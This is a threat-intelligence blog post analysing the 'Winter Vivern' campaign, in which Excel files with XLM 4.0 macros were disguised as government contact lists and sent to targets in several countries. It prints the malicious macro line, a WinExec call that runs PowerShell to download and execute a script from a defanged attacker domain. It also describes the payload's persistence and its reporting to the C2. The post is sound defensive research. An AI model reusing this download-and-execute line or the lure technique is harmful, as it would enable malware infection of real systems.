Winter Vivern: A Look At Re-Crafted Government
MalDocs Targeting Multiple Languages
domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs

Executive Summary
While parsing Microsoft Excel documents using XLM 4.0 macros, the DomainTools
Research team came across a Lithuanian-language document title innocuously named
“contacts”. The simple macro in this document dropped a slightly more complex PowerShell
script that performed C2 communications with a domain that has been active since
December 2020 and appeared on no industry-standard blocklists. The most recent domain
serving documents was registered in April 2021 and DomainTools Research believes other
domains used as short term distribution may lead to other documents. The macro and
domain mentioned, when hunted on, revealed documents targeting Azerbaijan, Cyprus,
India, Italy, Lithuania, Ukraine, and the Vatican. The DomainTools Research team
colloquially refers to this as “Winter Vivern” due to the path used in C2 communication over
the last several months.

Context For Defenders
XLM 4.0 macros, the precursor to VBA in Microsoft Office documents, continue to be a
problem as malware authors leverage them to avoid detection. Many times, well crafted
macros that span multiple cells and use obfuscation can be used to obscure adversary
1/7

infrastructure from virus scanners and other tools. While tooling has come a long way in the
last few years that XLM macros have been en vogue, the DomainTools Research team
continues to hunt for new and novel ways that attackers hide domains in these documents.
We suggest anyone looking into a document containing XLM macros take a look at the
excellent XLMMacroDeobfuscator tool to assist in parsing. However, do be aware that there
is currently a bug that breaks deobfuscation when multiple macros are in a single cell. This
was the bug the DomainTools Research team was trying to solve while hunting for
documents that failed in this way. As luck would have it the project maintainer already has a
fix in a testing branch if you as a defender come across this problem in documents you are
analyzing.

The Malicious Document
The initial Lithuanian-language document, titled vtas_kontaktai_2021_04_20.xls, contains
the typical request to enable content if the document is not functioning properly. The
document says it contains the “Contact Details of Municipal Administrations Departments
for the Protection of the Rights of the Child”.

This is a document which the official government of Lithuania provides and can be found on
Google as seen below.

However, the modified version includes a malicious XLM 4.0 macro that calls out to the
domain secure-daddy[.]com. This initial piece follows on all subsequent documents
mentioned later in this writing as well.
CALL("kernel32","WinExec","JCJ","powershell -c ""iex (New-Object
Net.Webclient).DownloadString( 'https://securedaddy[.]com/wintervivern/server/serverHttpRequest(RUN).txt')""",0)

When executing that string, another PowerShell script is pulled down and run which pulls
down one of two scheduled task files depending on the Microsoft Windows version it has
infected. These scheduled tasks regularly run the above pull from secure-daddy[.]com so
that the script can keep itself updated. The script contains a simple push with all system
information up to the C2, then checks at regular intervals for new commands, presumably
capable of dropping another payload.

Additional Targeting
Examining the origin of the document on VirusTotal we can see that the initial document
comes from the URL:
https://securemanag[.]com/data/public/uploads/2017/08/vtas_kontaktai_2021_04_20.xls

This URL also servers up the Azerbaijani-language application-for-visas.xls and a generic
Peace Institutions contact document in English. All documents contain the PowerShell
script mentioned above. When hunting for anything calling out to the secure-daddy[.]com
domain we found the Italian-language Rassegna Documentazioni Dicastero per la
Comunicazione.xls (first seen 2021-03-07) and the Cyprus-language document
Ενημερωμένος κατάλογος.xls (first seen 2021-04-21) which is another set of contactthemed documents. All documents so far have had an author of “Admin” and contained a
Cyrillic code page.

Since December 2020, secure-daddy[.]com has also been involved in distributing
documents from two URLs that would suggest earlier targeting of the Indian government
and the Vatican:
https://securedaddy[.]com/mail.gov.in/iwc_static/c11n/allDomain/Documents/mealib/List%20of%20online

https://secure-daddy[.]com/www.sdsofficium.va/portale/portalesdsext.nsf/

Attacker Infrastructure
Examining the attacker infrastructure, we found that neither domain was on an industrystandard blocklist, but that DomainTools predictive Risk Scoring algorithms did properly rate
them as the highest possible risk for malware.

5/7

While the initial C2 domain secure-daddy[.]com was registered in December 2020, the
serving domain securemanag[.]com has only been active since April 2021. This indicates to
us that the adversary is likely starting a new campaign, serving documents from this
address and hiding their C2 behind infrastructure they’re reusing from before. Both domains
are hosted on 3NT Solutions LLP, but are split between the older domain in Sweden and
the latest in Estonia.
Examining passive DNS we can see that there has been a decent run of activity on the C2
domain so presumably some of these documents have worked and more are out in the wild.
Additionally, the SPF record indicates that it accepts mail from a wide range of servers and
is set up (per the SPF record with ~all) to send mail in transition.

The newer, document-serving domain has a similar setup but only contains the
hostinger[.]com portion in its SPF record. However, what is more interesting is that the IP
address behind this domain was previously hosting centr-security[.]com. When searched for
in VirusTotal this reveals another document served up targeting Ukrainian-language
speakers from the URL https://centr-security[.]com/mil.gov.ua/documents/stat/statisticsdonbas-07042021.xls.

It’s important to note that centr-security[.]com has already been placed on a blocklist, but
that this domain is spoofing the Council of European National Top-Level Domain Registrars
(CENTR).

Conclusion
This campaign has seemed to have run largely undetected since around December 2020
with a wide range of targets and languages. As the scripts are unobfuscated and quite
simple, we don’t see this being a complex APT-level campaign as it doesn’t leverage any
known tooling. However, we feel it’s always important to note that sophistication is not a
requirement to success. Since this cluster of documents can’t be tied to any other
campaign, attribution is difficult at this time and DomainTools Research is monitoring this as
an independent cluster.
